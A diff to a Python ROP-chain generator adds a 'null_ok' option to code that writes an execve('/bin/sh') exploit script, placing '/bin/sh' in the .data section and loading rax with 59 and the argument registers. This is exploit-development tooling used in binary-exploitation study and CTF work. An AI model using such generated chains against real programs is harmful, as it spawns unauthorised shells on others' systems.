@@ -247,7 +247,7 @@ footer='''
 \tfd.close()    
 '''
 
-def execveROPChain(GadgetList, elf):
+def execveROPChain(GadgetList, elf, null_ok):
     global gadgetList
     print("\n\n-->Chaining to get a shell using execve system call")
     """ Get a section from the file, by name. Return None if no such
@@ -255,20 +255,17 @@ def execveROPChain(GadgetList, elf):
     """
     data_section_addr = elf.getDataSegment().address
     gadgetList = GadgetList
-    execve_bin_sh(data_section_addr)
+    execve_bin_sh(data_section_addr, null_ok)
     sys.exit()
 
-def execve_bin_sh(data_section_addr):
+def execve_bin_sh(data_section_addr, null_ok):
     # Step-1: Open the file where the payload is written in the form of a python script
     fd = open("execveROPChain.py", "w")
     fd.write(header)
     
     # Step-2: Writing "/bin/sh\x00" into .data section
-    binsh = b'/bin//sh\x00\x00\x00\x00\x00\x00\x00\x00'
+    binsh = b'/bin//sh\x00\x00\x00\x00\x00\x00\x00\x00' if not null_ok else b'/bin/sh\x00'
     fd.write(WriteStuffIntoMemory(binsh, data_section_addr))
-    
-    # TODO: Make a LoadSmallCosntIntoReg that loads constants smaller than 256.
-    # We need to prevent null bytes if possible.
     
     # Step-3: Write appropriate register values: 
     # rax <- 59
@@ -278,7 +275,8 @@ def execve_bin_sh(data_section_addr):
     fd.write(loadConstsIntoRegs(\
         ["rax", "rdi", "rsi", "rdx"], \
         comments = ["prep rax for execve syscall", "command to run", "pointer to null", "pointer to null"], \
-        isSmall = [True, False, False, False], noClobber = [], \
+        isSmall = [True, False, False, False] if not null_ok else [], \
+        noClobber = [], \
         consts = [59, data_section_addr, data_section_addr+8, data_section_addr+8], isOffsets = [False, True, True, True]))
     
     # Get syscall
